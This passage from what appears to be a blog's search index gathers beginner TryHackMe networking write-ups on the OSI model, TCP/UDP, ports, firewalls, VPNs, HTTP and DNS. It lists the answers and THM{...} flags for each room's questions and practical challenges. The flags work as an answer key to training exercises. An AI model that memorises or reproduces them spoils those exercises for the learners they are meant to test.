data (known as packets) from the “webserver”, where the “computer” re-constructs the picture of the dog into the correct order.Now let’s move onto the User Datagram Protocol (or UDP for short). This protocol is not nearly as advanced as its brother - the TCP protocol. It doesn’t boast the many features offered by TCP, such as error checking and reliability. In fact, any data that gets sent via UDP is sent to the computer whether it gets there or not. There is no synchronisation between the two devices or guarantee; just hope for the best, and fingers crossed.Whilst this sounds disadvantageous, it does have its merits, which we’ll layout in the table below: Advantages of UDP Disadvantages of UDP UDP is much faster than TCP. UDP doesn’t care if the data is received. UDP leaves the application layer (user software) to decide if there is any control over how quickly packets are sent. It is quite flexible to software developers in this sense. UDP does not reserve a continuous connection on a device as TCP does. This means that unstable connections result in a terrible experience for the user. Using the same example as before, we can now see that only Packets #1 and #3 have been received by the “Computer”, meaning that half of the image is missing.Answer the questions belowWhat is the name of this Layer? TransportWhat does TCP stand for? Transmission Control ProtocolWhat does UDP stand for? User Datagram ProtocolWhat protocol guarantees the accuracy of data? TCPWhat protocol doesn’t care if data is received or not by the other device? UDPWhat protocol would an application such as an email client use? TCPWhat protocol would an application that downloads files use? TCPWhat protocol would an application that streams video use? UDPLayer 3 - NetworkThe third layer of the OSI model (network layer) is where the magic of routing &amp;amp; re-assembly of data takes place (from these small chunks to the larger chunk). Firstly, routing simply determines the most optimal path in which these chunks of data should be sent.Whilst some protocols at this layer determine exactly what is the “optimal” path that data should take to reach a device, we should only know about their existence at this stage of the networking module. Briefly, these protocols include OSPF (Open Shortest Path First) and RIP (Routing Information Protocol). The factors that decide what route is taken is decided by the following: What path is the shortest? I.e. has the least amount of devices that the packet needs to travel across. What path is the most reliable? I.e. have packets been lost on that path before? Which path has the faster physical connection? I.e. is one path using a copper connection (slower) or a fibre (considerably faster)?At this layer, everything is dealt with via IP addresses such as 192.168.1.100. Devices such as routers capable of delivering packets using IP addresses are known as Layer 3 devices — because they are capable of working at the third layer of the OSI model.Answer the questions belowWhat is the name of this Layer? NetworkWill packets take the most optimal route across a network? (Y/N) YWhat does the acronym “OSPF” stand for? Open Shortest Path FirstWhat does the acronym “RIP” stand for? Routing Information ProtocolWhat type of addresses are dealt with at this layer? IP AddressesLayer 2 - Data LinkThe data link layer focuses on the physical addressing of the transmission. It receives a packet from the network layer (including the IP address for the remote computer) and adds in the physical MAC (Media Access Control) address of the receiving endpoint. Inside every network-enabled computer is a Network Interface Card (NIC) which comes with a unique MAC address to identify it.MAC addresses are set by the manufacturer and literally burnt into the card; they can’t be changed – although they can be spoofed. When information is sent across a network, it’s actually the physical address that is used to identify where exactly to send the information.Additionally, it’s also the job of the data link layer to present the data in a format suitable for transmission.Answer the questions belowWhat is the name of this Layer? Data LinkWhat is the name of the piece of hardware that all networked devices come with? Network Interface CardLayer 1 - PhysicalThis layer is one of the easiest layers to grasp. Put simply, this layer references the physical components of the hardware used in networking and is the lowest layer that you will find. Devices use electrical signals to transfer data between each other in a binary numbering system (1’s and 0’s).For example, ethernet cables connecting devices, such as in the diagram below:Answer the questions belowWhat is the name of this Layer? PhysicalWhat is the name of the numbering system that is both 0’s and 1’s? BinaryWhat is the name of the cables that are used to connect devices? Ethernet CablesPractical - OSI GameCan you escape the OSI dungeon? Climb the levels in the correct order to escape the dungeon and reveal the flag! (Can you beat our staff high score of 19 seconds?)Click the “View Site” button on the right to start.Answer the questions belowEscape the dungeon to retrieve the flag. What is the flag? THM{OSI_DUNGEON_ESCAPED}" }, { "title": "Packets and Frames", "url": "/posts/Packets-and-Frames/", "categories": "Tryhackme, Pre Security", "tags": "packets, frames, three-way-handshake, ports", "date": "2021-07-06 11:11:11 +0530", "snippet": "Understand how data is divided into smaller pieces and transmitted across a network to another deviceWhat are Packets and FramesPackets and frames are small pieces of data that, when forming together, make a larger piece of information or message. However, they are two different things in the OSI model. A frame is at layer 2 - the data link layer, meaning there is no such information as IP addresses. Think of this as putting an envelope within an envelope and sending it away. The first envelope will be the packet that you mail, but once it is opened, the envelope within still exists and contains data (this is a frame).This process is called encapsulation which we discussed in the OSI model articles. At this stage, it’s safe to assume that when we are talking about anything IP addresses, we are talking about packets. When the encapsulating information is stripped away, we’re talking about the frame itself.Packets are an efficient way of communicating data across networked devices such as those explained in Task 1. Because this data is exchanged in small pieces, there is less chance of bottlenecking occurring across a network than large messages being sent at once.For example, when loading an image from a website, this image is not sent to your computer as a whole, but rather small pieces where it is reconstructed on your computer. Take the image below as an illustration of this process. The dog’s picture is divided into three packets, where it is reconstructed when it reaches the computer to form the final image.Packets have different structures that are dependant upon the type of packet that is being sent. As we’ll come on to discuss, networking is full of standards and protocols that act as a set of rules for how the packet is handled on a device. With the Internet predicted to have approximately 50 billion devices connected by the end of 2020, things quickly get out of hand if there is no standardisation.Let’s continue with our example of the Internet Protocol. A packet using this protocol will have a set of headers that contain additional pieces of information to the data that is being sent across a network.Some notable headers include: Header Description Time to Live This field sets an expiry timer for the packet to not clog up your network if it never manages to reach a host or escape! Checksum This field provides integrity checking for protocols such as TCP/IP. If any data is changed, this value will be different from what was expected and therefore corrupt. Source Address The IP address of the device that the packet is being sent from so that data knows where to return to. Destination Address The device’s IP address the packet is being sent to so that data knows where to travel next. Answer the questions belowWhat is the name for a piece of data when it does have IP addressing information? PacketWhat is the name for a piece of data when it does not have IP addressing information? FrameTCP/IP (The Three-Way Handshake)TCP (or Transmission Control Protocol for short) is another one of these rules used in networking.This protocol is very similar to the OSI model that we have previously discussed in room three of this module so far. The TCP/IP protocol consists of four layers and is arguably just a summarised version of the OSI model. These layers are: Application Transport Internet Network InterfaceVery similar to how the OSI model works, information is added to each layer of the TCP model as the piece of data (or packet) traverses it. As you may recall, this process is known as encapsulation - where the reverse of this process is decapsulation.One defining feature of TCP is that it is connection-based, which means that TCP must establish a connection between both a client and a device acting as a server before data is sent.TCP packets contain various sections of information known as headers that are added from encapsulation. Let’s explain some of the crucial headers in the table below: Header Description Source Port This value is the port opened by the sender to send the TCP packet from. This value is chosen randomly (out of the ports from 0-65535 that aren’t already in use at the time). Destination Port This value is the port number that an application or service is running on the remote host (the one receiving data); for example, a webserver running on port 80. Unlike the source port, this value is not chosen at random. Source IP This is the IP address of the device that is sending the packet. Destination IP This is the IP address of the device that the packet is destined for. Sequence Number When a connection occurs, the first piece of data transmitted is given a random number. We’ll explain this more in-depth further on. Acknowledgement Number After a piece of data has been given a sequence number, the number for the next piece of data will have the sequence number + 1. We’ll also explain this more in-depth further on. Checksum This value is what gives TCP integrity. A mathematical calculation is made where the output is remembered. When the receiving device performs the mathematical calculation, the data must be corrupt if the output is different from what was sent. Data This header is where the data, i.e. bytes of a file that is being transmitted, is stored. Flag This header determines how the packet should be handled by either device during the handshake process. Specific flags will determine specific behaviours, which is what we’ll come on to explain below. Next, we’ll come on to discuss the Three-way handshake - the term given for the process used to establish a connection between two devices. The Three-way handshake communicates using a few special messages - the table below highlights the main ones: Step Message Description 1 SYN A SYN message is the initial packet sent by a client during the handshake. This packet is used to initiate a connection and synchronise the two devices together (we’ll explain this further later on). 2 SYN/ACK This packet is sent by the receiving device (server) to acknowledge the synchronisation attempt from the client. 3 ACK The acknowledgement packet can be used by either the client or server to acknowledge that a series of messages/packets have been successfully received. 4 DATA Once a connection has been established, data (such as bytes of a file) is sent via the “DATA” message. 5 FIN This packet is used to cleanly (properly) close the connection after it has been complete. # RST This packet abruptly ends all communication. This is the last resort and indicates there was some problem during the process. For example, if the service or application is not working correctly, or the system has faults such as low resources. The diagram below shows a normal Three-way handshake process between Alice and Bob. In real life, this would be between two devices.Any sent data is given a random number sequence and is reconstructed using this number sequence and incrementing by 1. Both computers must agree on the same number sequence for data to be sent in the correct order. This order is agreed upon during three steps: SYN - Client: Here’s my Initial Number Sequence (ISN) to SYNchronise with (0) SYN/ACK - Server: Here’s my Initial Number Sequence (ISN) to SYNchronise with (5,000), and I ACKnowledge your initial number sequence (0) ACK - Client: I ACKnowledge your Initial Number Sequence (ISN) of (5,000), here is some data that is my ISN+1 (5,000 + 1) Device Initial Number Sequence (ISN) Final Number Sequence Client (Sender) 0 0 + 1 = 1 Client (Sender) 1 1 + 1 = 2 Client (Sender) 2 2 + 1 = 3 TCP Closing a Connection:Let’s quickly explain the process behind TCP closing a connection. First, TCP will close a connection once a device has determined that the other device has successfully received all of the data.Because TCP reserves system resources on a device, it is best practice to close TCP connections as soon as possible.To initiate the closure of a TCP connection, the device will send a “FIN” packet to the other device. Of course, with TCP, the other device will also have to acknowledge this packet.Let’s show this process using Alice and Bob as we have previously.In the illustration, we can see that Alice has sent Bob a “FIN” packet. Because Bob received this, he will let Alice know that he received it and that he also wants to close the connection (using FIN). Alice has heard Bob loud and clear and will let Bob know that she acknowledges this.Answer the questions belowWhat is the header in a TCP packet that ensures the integrity of data? checksumProvide the order of a normal Three-way handshake (with each step separated by a comma) SYN,SYN/ACK,ACKPractical - HandshakeHelp Alice and Bob communicate by re-assembling the TCP handshake in the correct order in the static lab attached to this task!Enter the value of the flag given at the end of the conversation into the question below.Answer the questions belowWhat is the value of the flag given at the end of the conversation? THM{TCP_CHATTER}UDP/IPThe User Datagram Protocol (UDP) is another protocol that is used to communicate data between devices.Unlike its brother TCP, UDP is a stateless protocol that doesn’t require a constant connection between the two devices for data to be sent. For example, the Three-way handshake does not occur, nor is there any synchronisation between the two devices.Recall some of the comparisons made about these two protocols in Room 3: “OSI Model”. Namely, UDP is used in situations where applications can tolerate data being lost (such as video streaming or voice chat) or in scenarios where an unstable connection is not the end-all.As mentioned, no process takes place in setting up a connection between two devices. Meaning that there is no regard for whether or not data is received, and there are no safeguards such as those offered by TCP, such as data integrity.UDP packets are much simpler than TCP packets and have fewer headers. However, both protocols share some standard headers, which are what is annotated in the table below: Header Description Time to Live (TTL) This field sets an expiry timer for the packet, so it doesn’t clog up your network if it never manages to reach a host or escape! Source Address The IP address of the device that the packet is being sent from, so that data knows where to return to. Destination Address The device’s IP address the packet is being sent to so that data knows where to travel next. Source Port This value is the port that is opened by the sender to send the TCP packet from. This value is chosen randomly (out of the ports from 0-65535 that aren’t already in use at the time). Destination Port This value is the port number that an application or service is running on the remote host (the one receiving data); for example, a webserver running on port 80. Unlike the source port, this value is not chosen at random. Data This header is where the data, i.e. bytes of a file that is being transmitted, is stored. Next, we’ll come on to discuss how the process of a connection via UDP differs from that of something such as TCP. We should recall that UDP is stateless. No acknowledgement is sent during a connection.The diagram below shows a normal UDP connection between Alice and Bob. In real life, this would be between two devices.Answer the questions belowWhat does the term “UDP” stand for? User Datagram ProtocolWhat type of connection is “UDP”? statelessWhat protocol would you use to transfer a file? TCPWhat protocol would you use to have a video call? UDPPorts 101 (Practical)Perhaps aptly titled by their name, ports are an essential point in which data can be exchanged. Think of a harbour and port. Ships wishing to dock at the harbour will have to go to a port compatible with the dimensions and the facilities located on the ship. When the ship lines up, it will connect to a port at the harbour. Take, for instance, that a cruise liner cannot dock at a port made for a fishing vessel and vice versa.These ports enforce what can park and where — if it isn’t compatible, it cannot park here. Networking devices also use ports to enforce strict rules when communicating with one another. When a connection has been established (recalling from the OSI model’s room), any data sent or received by a device will be sent through these ports. In computing, ports are a numerical value between 0 and 65535 (65,535).Because ports can range from anywhere between 0-65535, there quickly runs the risk of losing track of what application is using what port. A busy harbour is chaos! Thankfully, we associate applications, software and behaviours with a standard set of rules. For example, by enforcing that any web browser data is sent over port 80, software developers can design a web browser such as Google Chrome or Firefox to interpret the data the same way as one another.This means that all web browsers now share one common rule: data is sent over port 80. How the browsers look, feel and easy to use is up to the designer or the user’s decision.While the standard rule for web data is port 80, a few other protocols have been allocated a standard rule. Any port that is within 0 and 1024 (1,024) is known as a common port. Let’s explore some of these other protocols below: Protocol Port Number Description File Transfer Protocol (FTP) 21 This protocol is used by a file-sharing application built on a client-server model, meaning you can download files from a central location. Secure Shell (SSH) 22 This protocol is used to securely login to systems via a text-based interface for management. HyperText Transfer Protocol (HTTP) 80 This protocol powers the World Wide Web (WWW)! Your browser uses this to download text, images and videos of web pages. HyperText Transfer Protocol Secure (HTTPS) 443 This protocol does the exact same as above; however, securely using encryption. Server Message Block (SMB) 445 This protocol is similar to the File Transfer Protocol (FTP); however, as well as files, SMB allows you to share devices like printers. Remote Desktop Protocol (RDP) 3389 This protocol is a secure means of logging in to a system using a visual desktop interface (as opposed to the text-based limitations of the SSH protocol). We have only briefly covered the more common protocols in cybersecurity. You can find a table of the 1024 common ports listed for more information.What is worth noting here is that these protocols only follow the standards. I.e. you can administer applications that interact with these protocols on a different port other than what is the standard (running a web server on 8080 instead of the 80 standard port). Note, however, applications will presume that the standard is being followed, so you will have to provide a colon (:) along with the port number.Practical Challenge:Open the site attached to this task and connect to the IP address “8.8.8.8” on port “1234”, and you’ll receive a flag.Answer the questions belowWhat is the flag received from the challenge? THM{YOU_CONNECTED_TO_A_PORT}" }, { "title": "Expanding Your Network", "url": "/posts/Exapanding-Your-Network/", "categories": "Tryhackme, Pre Security", "tags": "port forwarding, firewall, vpn, lan", "date": "2021-07-05 11:11:11 +0530", "snippet": "Learn about some of the technologies used to extend networks out onto the Internet and the motivations for this.Introduction to Port ForwardingPort forwarding is an essential component in connecting applications and services to the Internet. Without port forwarding, applications and services such as web servers are only available to devices within the same direct network.Take the network below as an example. Within this network, the server with an IP address of “192.168.1.10” runs a webserver on port 80. Only the two other computers on this network will be able to access it (this is known as an intranet).If the administrator wanted the website to be accessible to the public (using the Internet), they would have to implement port forwarding, like in the diagram below:With this design, Network #2 will now be able to access the webserver running on Network #1 using the public IP address of Network #1 (82.62.51.70).It is easy to confuse port forwarding with the behaviours of a firewall (a technology we’ll come on to discuss in a later task). However, at this stage, just understand that port forwarding opens specific ports (recall how packets work). In comparison, firewalls determine if traffic can travel across these ports (even if these ports are open by port forwarding).Port forwarding is configured at the router of a network.Answer the questions belowWhat is the name of the device that is used to configure port forwarding? routerFirewalls 101A firewall is a device within a network responsible for determining what traffic is allowed to enter and exit. Think of a firewall as border security for a network. An administrator can configure a firewall to permit or deny traffic from entering or exiting a network based on numerous factors such as: Where the traffic is coming from? (has the firewall been told to accept/deny traffic from a specific network?) Where is the traffic going to? (has the firewall been told to accept/deny traffic destined for a specific network?) What port is the traffic for? (has the firewall been told to accept/deny traffic destined for port 80 only?) What protocol is the traffic using? (has the firewall been told to accept/deny traffic that is UDP, TCP or both?)Firewalls perform packet inspection to determine the answers to these questions.Firewalls come in all shapes and sizes. From dedicated pieces of hardware (often found in large networks like businesses) that can handle a magnitude of data to residential routers (like at your home!) or software such as Snort, firewalls can be categorised into 2 to 5 categories.We’ll cover the two primary categories of firewalls in the table below: Firewall Category Description Stateful This type of firewall uses the entire information from a connection; rather than inspecting an individual packet, this firewall determines the behaviour of a device based upon the entire connection.This firewall type consumes many resources in comparison to stateless firewalls as the decision making is dynamic. For example, a firewall could allow the first parts of a TCP handshake that would later fail.If a connection from a host is bad, it will block the entire device. Stateless This firewall type uses a static set of rules to determine whether or not individual packets are acceptable or not. For example, a device sending a bad packet will not necessarily mean that the entire device is then blocked.Whilst these firewalls use much fewer resources than alternatives, they are much dumber. For example, these firewalls are only effective as the rules that are defined within them. If a rule is not exactly matched, it is effectively useless.However, these firewalls are great when receiving large amounts of traffic from a set of hosts (such as a Distributed Denial-of-Service attack) Answer the questions belowWhat layers of the OSI model do firewalls operate at? Layer 3,Layer 4What category of firewall inspects the entire connection? statefulWhat category of firewall inspects individual packets? statelessPractical - FirewallDeploy the static site attached to this task. You must correctly configure the firewall to prevent the device from overloading to receive the flag!Answer the questions belowWhat is the flag? THM{FIREWALLS_RULE}VPN BasicsA Virtual Private Network (or VPN for short) is a technology that allows devices on separate networks to communicate securely by creating a dedicated path between each other over the Internet (known as a tunnel). Devices connected within this tunnel form their own private network.For example, only devices within the same network (such as within a business) can directly communicate. However, a VPN allows two offices to be connected. Let’s take the diagram below, where there are three networks: Network #1 (Office #1) Network #2 (Office #2) Network #3 (Two devices connected via a VPN)The devices connected on Network #3 are still a part of Network #1 and Network #2 but also form together to create a private network (Network #3) that only devices that are connected via this VPN can communicate over.Let’s cover some of the other benefits offered by a VPN in the table below: Benefit Description Allows networks in different geographical locations to be connected. For example, a business with multiple offices will find VPNs beneficial, as it means that resources like servers/infrastructure can be accessed from another office. Offers privacy. VPN technology uses encryption to protect data. This means that it can only be understood between the devices it was being sent from and is destined for, meaning the data isn’t vulnerable to sniffing.This encryption is useful in places with public WiFi, where no encryption provided by the network. You can use a VPN to protect your traffic from being viewed by other people. Offers anonyminity. Journalists and activists depend upon VPNs to safely report on global issues in countries where freedom of speech is controlled.Usually, your traffic can be viewed by your ISP and other intermediaries and therefore tracked. The level of anonymity a VPN provides is only as much as how other devices on the network respect privacy.. For example, a VPN that logs all of your data/history is essentially the same as not using a VPN in this regard. VPN Technology Description PPP This technology is used by PPTP (explained below) to allow for authentication and provide encryption of data. VPNs work by using a private key and public certificate (similar to SSH). A private key &amp;amp; certificate must match for you to connect.This technology is not capable of leaving a network by itself (non-routable). PPTP The Point-to-Point Tunneling Protocol (PPTP) is the technology that allows the data from PPP to travel and leave a network. PPTP is very easy to set up and is supported by most devices. It is, however, weakly encrypted in comparison to alternatives. IPSec Internet Protocol Security (IPsec) encrypts data using the existing Internet Protocol (IP) framework.IPSec is difficult to set up in comparison to alternatives; however, if successful, it boasts strong encryption and is also supported on many devices. Answer the questions belowWhat VPN technology only encrypts &amp;amp; provides the authentication of data? PPPWhat VPN technology uses the IP framework? IPSecLAN Networking DevicesWhat is a Router?It’s a router’s job to connect networks and pass data between them. It does this by using routing (hence the name router!).Routing is the label given to the process of data travelling across networks. Routing involves creating a path between networks so that this data can be successfully delivered. Routers operate at Layer 3 of the OSI model. They often feature an interactive interface (such as a website or a console) that allows an administrator to configure various rules such as port forwarding or firewalling.Routing is useful when devices are connected by many paths, such as in the example diagram below, where the most optimal path is taken:Routers are dedicated devices and do not perform the same functions as switches.We can see that Computer A’s network is connected to the network of Computer B by two routers in the middle. The question is: what path will be taken? Different protocols will decide what path should be taken, but factors include: What path is the shortest? What path is the most reliable? Which path has the faster medium (e.g. copper or fibre)? What is a Switch?A switch is a dedicated networking device responsible for providing a means of connecting to multiple devices. Switches can facilitate many devices (from 3 to 63) using Ethernet cables.Switches can operate at both layer 2 and layer 3 of the OSI model. However, these are exclusive in the sense that Layer 2 switches cannot operate at layer 3.Take, for example, a layer 2 switch in the diagram below. These switches will forward frames (remember these are no longer packets as the IP protocol has been stripped) onto the connected devices using their MAC address.These switches are solely responsible for sending frames to the correct device.Now, let’s move onto layer 3 switches. These switches are more sophisticated than layer 2, as they can perform some of the responsibilities of a router. Namely, these switches will send frames to devices (as layer 2 does) and route packets to other devices using the IP protocol.Let’s take a look at the diagram below of a layer 3 switch in action. We can see that there are two IP addresses: 192.168.1.1 192.168.2.1A technology called VLAN (Virtual Local Area Network) allows specific devices within a network to be virtually split up. This split means they can all benefit from things such as an Internet connection but are treated separately. This network separation provides security because it means that rules in place determine how specific devices communicate with each other. This segregation is illustrated in the diagram below:In the context of the diagram above, the “Sales Department” and “Accounting Department” will be able to access the Internet, but not able to communicate with each other (although they are connected to the same switch).Answer the questions belowWhat is the verb for the action that a router does? routingWhat are the two different layers of switches? Separate these by a comma I.e.: LayerX,LayerY Layer2,Layer3Practical - Network SimulatorDeploy the static site attached to this task. And experiment with the network simulator. The simulator will break down every step a packet needs to take to get from point a to b. Try sending a TCP packet from computer1 to computer3 to reveal a flag.Answer the questions belowWhat is the flag from the network simulator? THM{YOU’VE_GOT_DATA}How many HANDSHAKE entries are there in the Network Log? 5" }, { "title": "HTTP In Detail", "url": "/posts/HTTP-In-Detail/", "categories": "Tryhackme, Pre Security", "tags": "http, http method, http status code, cookies, header", "date": "2021-07-04 11:11:11 +0530", "snippet": "What is HTTP(S)?What is HTTP? (HyperText Transfer Protocol)HTTP is what’s used whenever you view a website, developed by Tim Berners-Lee and his team between 1989-1991. HTTP is the set of rules used for communicating with web servers for the transmitting of webpage data, whether that is HTML, Images, Videos, etc.What is HTTPS? (HyperText Transfer Protocol Secure)HTTPS is the secure version of HTTP. HTTPS data is encrypted so it not only stops people from seeing the data you are receiving and sending, but it also gives you assurances that you’re talking to the correct web server and not something impersonating it.Answer the questions belowWhat does HTTP stand for? HyperText Transfer ProtocolWhat does the S in HTTPS stand for? secureOn the mock webpage on the right there is an issue, once you’ve found it, click on it. What is the challenge flag? THM{INVALID_HTTP_CERT}Requests And ResponsesWhen we access a website, your browser will need to make requests to a web server for assets such as HTML, Images, and download the responses. Before that, you need to tell the browser specifically how and where to access these resources, this is where URLs will help.What is a URL? (Uniform Resource Locator)If you’ve used the internet, you’ve used a URL before. A URL is predominantly an instruction on how to access a resource on the internet. The below image shows what a URL looks like with all of its features (it does not use all features in every request).Scheme: This instructs on what protocol to use for accessing the resource such as HTTP, HTTPS, FTP (File Transfer Protocol).User: Some services require authentication to log in, you can put a username and password into the URL to log in.Host: The domain name or IP address of the server you wish to access.Port: The Port that you are going to connect to, usually 80 for HTTP and 443 for HTTPS, but this can be hosted on any port between 1 - 65535.Path: The file name or location of the resource you are trying to access.Query String: Extra bits of information that can be sent to the requested path. For example, /blog?id=1 would tell the blog path that you wish to receive the blog article with the id of 1.Fragment: This is a reference to a location on the actual page requested. This is commonly used for pages with long content and can have a certain part of the page directly linked to it, so it is viewable to the user as soon as they access the page.Making a RequestIt’s possible to make a request to a web server with just one line “GET / HTTP/1.1”But for a much richer web experience, you’ll need to send other data as well. This other data is sent in what is called headers, where headers contain extra information to give to the web server you’re communicating with, but we’ll go more into this in the Header task.Example Request:GET / HTTP/1.1Host: tryhackme.comUser-Agent: Mozilla/5.0 Firefox/87.0Referer: https://tryhackme.com/To breakdown each line of this request:Line 1: This request is sending the GET method ( more on this in the HTTP Methods task ), request the home page with / and telling the web server we are using HTTP protocol version 1.1.Line 2: We tell the web server we want the website tryhackme.comLine 3: We tell the web server we are using the Firefox version 87 BrowserLine 4: We are telling the web server that the web page that referred us to this one is https://tryhackme.comLine 5: HTTP requests always end with a blank line to inform the web server that the request has finished.Example Response:HTTP/1.1 200 OKServer: nginx/1.15.8Date: Fri, 09 Apr 2021 13:34:03 GMTContent-Type: text/htmlContent-Length: 98&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;TryHackMe&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; Welcome To TryHackMe.com&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;To breakdown each line of the response:Line 1: HTTP 1.1 is the version of the HTTP protocol the server is using and then followed by the HTTP Status Code in this case “200 Ok” which tells us the request has completed successfully.Line 2: This tells us the web server software and version number.Line 3: The current date, time and timezone of the web server.Line 4: The Content-Type header tells the client what sort of information is going to be sent, such as HTML, images, videos, pdf, XML.Line 5: Content-Length tells the client how long the response is, this way we can confirm no data is missing.Line 6: HTTP response contains a blank line to confirm the end of the HTTP response.Lines 7-14: The information that has been requested, in this instance the homepage.Answer the questions belowWhat HTTP protocol is being used in the above example? HTTP/1.1What response header tells the browser how much data to expect? Content-LengthHTTP MethodsHTTP methods are a way for the client to show their intended action when making an HTTP request. There are a lot of HTTP methods but we’ll cover the most common ones, although mostly you’ll deal with the GET and POST method.GET RequestThis is used for getting information from a web server.POST RequestThis is used for submitting data to the web server and potentially creating new recordsPUT RequestThis is used for submitting data to a web server to update informationDELETE RequestThis is used for deleting information/records from a web server.Answer the questions belowWhat method would be used to create a new user account? POSTWhat method would be used to update your email address? PUTWhat method would be used to remove a picture you’ve uploaded to your account? DELETEWhat method would be used to view a news article? GETHTTP Status CodesIn the previous task, you learnt that when a HTTP server responds, the first line always contains a status code informing the client of the outcome of their request and also potentially how to handle it. These status codes can be broken down into 5 different ranges: Status code Description 100-199 - Information Response These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common. 200-299 - Success This range of status codes is used to tell the client their request was successful. 300-399 - Redirection These are used to redirect the client’s request to another resource. This can be either to a different webpage or a different website altogether. 400-499 - Client Errors Used to inform the client that there was an error with their request. 500-599 - Server Errors This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request. There are a lot of different HTTP status codes and that’s not including the fact that applications can even define their own, we’ll go over the most common HTTP responses you are likely to come across: 200 - OK The request was completed successfully. 201 - Created A resource has been created (for example a new user or new blog post). 301 - Permanent Redirect This redirects the client’s browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead. 302 - Temporary Redirect Similar to the above permanent redirect, but as the name suggests, this is only a temporary change and it may change again in the near future. 400 - Bad Request This tells the browser that something was either wrong or missing in their request. This could sometimes be used if the web server resource that is being requested expected a certain parameter that the client didn’t send. 401 - Not Authorised You are not currently allowed to view this resource until you have authorised with the web application, most commonly with a username and password. 403 - Forbidden You do not have permission to view this resource whether you are logged in or not. 405 - Method Not Allowed The resource does not allow this method request, for example, you send a GET request to the resource /create-account when it was expecting a POST request instead. 404 - Page Not Found The page/resource you requested does not exist. 500 - Internal Service Error The server has encountered some kind of error with your request that it doesn’t know how to handle properly. 503 - Service Unavailable This server cannot handle your request as it’s either overloaded or down for maintenance. Answer the questions belowWhat response code might you receive if you’ve created a new user or blog post article? 201What response code might you receive if you’ve tried to access a page that doesn’t exist? 404What response code might you receive if the web server cannot access its database and the application crashes? 503What response code might you receive if you try to edit your profile without logging in first? 401HeadersHeaders are additional bits of data you can send to the web server when making requests.Although no headers are strictly required when making a HTTP request, you’ll find it difficult to view a website properly.Common Request HeadersThese are headers that are sent from the client (usually your browser) to the server.Host: Some web servers host multiple websites so by providing the host headers you can tell it which one you require, otherwise you’ll just receive the default website for the server.User-Agent: This is your browser software and version number, telling the web server your browser software helps it format the website properly for your browser and also some elements of HTML, JavaScript and CSS are only available in certain browsers.Content-Length: When sending data to a web server such as in a form, the content length tells the web server how much data to expect in the web request. This way the server can ensure it isn’t missing any data.Accept-Encoding: Tells the web server what types of compression methods the browser supports so the data can be made smaller for transmitting over the internet.Cookie: Data sent to the server to help remember your information (see cookies task for more information).Common Response HeadersThese are the headers that are returned to the client from the server after a request.Set-Cookie: Information to store which gets sent back to the web server on each request (see cookies task for more information).Cache-Control: How long to store the content of the response in the browser’s cache before it requests it again.Content-Type: This tells the client what type of data is being returned, i.e., HTML, CSS, JavaScript, Images, PDF, Video, etc. Using the content-type header the browser then knows how to process the data.Content-Encoding: What method has been used to compress the data to make it smaller when sending it over the internet.Answer the questions belowWhat header tells the web server what browser is being used? User-AgentWhat header tells the browser what type of data is being returned? Content-TypeWhat header tells the web server which website is being requested? HostCookiesYou’ve probably heard of cookies before, they’re just a small piece of data that is stored on your computer. Cookies are saved when you receive a “Set-Cookie” header from a web server. Then every further request you make, you’ll send the cookie data back to the web server. Because HTTP is stateless (doesn’t keep track of your previous requests), cookies can be used to remind the web server who you are, some personal settings for the website or whether you’ve been to the website before. Let’s take a look at this as an example HTTP request:Cookies can be used for many purposes but are most commonly used for website authentication. The cookie value won’t usually be a clear-text string where you can see the password, but a token (unique secret code that isn’t easily humanly guessable).Viewing Your CookiesYou can easily view what cookies your browser is sending to a website by using the developer tools, in your browser. If you’re not sure how to get to the developer tools in your browser, click on the “View Site” button at the top of this task for a how-to guide.Once you have developer tools open, click on the “Network” tab. This tab will show you a list of all the resources your browser has requested. You can click on each one to receive a detailed breakdown of the request and response. If your browser sent a cookie, you will see these on the “Cookies” tab of the request.Answer the questions belowWhich header is used to save cookies to your computer? Set-CookieMaking RequestsClick the “View Site” button on the right.This is an emulator for making demo HTTP requests, using what you’ve learnt from the above tasks you can use it to complete the below questions.Answer the questions belowMake a GET request to /room THM{YOU’RE_IN_THE_ROOM}Make a GET request to /blog and using the gear icon set the id parameter to 1 in the URL field THM{YOU_FOUND_THE_BLOG}Make a DELETE request to /user/1 THM{USER_IS_DELETED}Make a PUT request to /user/2 with the username parameter set to admin THM{USER_HAS_UPDATED}POST the username of thm and a password of letmein to /login THM{HTTP_REQUEST_MASTER}" }, { "title": "DNS In Details", "url": "/posts/DNS-In-Detailes/", "categories": "Tryhackme, Pre Security", "tags": "dns, domain, cname, aaa, mx, txt", "date": "2021-07-04 11:11:11 +0530", "snippet": "Learn how DNS works and how it helps you access internet services.What is DNS?What is DNS?DNS (Domain Name System) provides a simple way for us to communicate with devices on the internet without remembering complex numbers. Much like every house has a unique address for sending mail directly to it, every computer on the internet has its own unique address to communicate with it called an IP address. An IP address looks like the following 104.26.10.229, 4 sets of digits ranging from 0 - 255 separated by a period. When you want to visit a website, it’s not exactly convenient to remember this complicated set of numbers, and that’s where DNS can help. So instead of remembering 104.26.10.229, you can remember tryhackme.com instead.Answer the questions belowWhat does DNS stand for? Domain Name SystemDomain HierarchyTLD (Top-Level Domain)A TLD is the most righthand part of a domain name. So, for example, the tryhackme.com TLD is .com. There are two types of TLD, gTLD (Generic Top Level) and ccTLD (Country Code Top Level Domain). Historically a gTLD was meant to tell the user the domain name’s purpose; for example, a .com would be for commercial purposes, .org for an organisation, .edu for education and .gov for government. And a ccTLD was used for geographical purposes, for example, .ca for sites based in Canada, .co.uk for sites based in the United Kingdom and so on. Due to such demand, there is an influx of new gTLDs ranging from .online , .club , .website , .biz and so many more. For a full list of over 2000 TLDs click here.Second-Level DomainTaking tryhackme.com as an example, the .com part is the TLD, and tryhackme is the Second Level Domain. When registering a domain name, the second-level domain is limited to 63 characters + the TLD and can only use a-z 0-9 and hyphens (cannot start or end with hyphens or have consecutive hyphens).SubdomainA subdomain sits on the left-hand side of the Second-Level Domain using a period to separate it; for example, in the name admin.tryhackme.com the admin part is the subdomain. A subdomain name has the same creation restrictions as a Second-Level Domain, being limited to 63 characters and can only use a-z 0-9 and hyphens (cannot start or end with hyphens or have consecutive hyphens). You can use multiple subdomains split with periods to create longer names, such as jupiter.servers.tryhackme.com. But 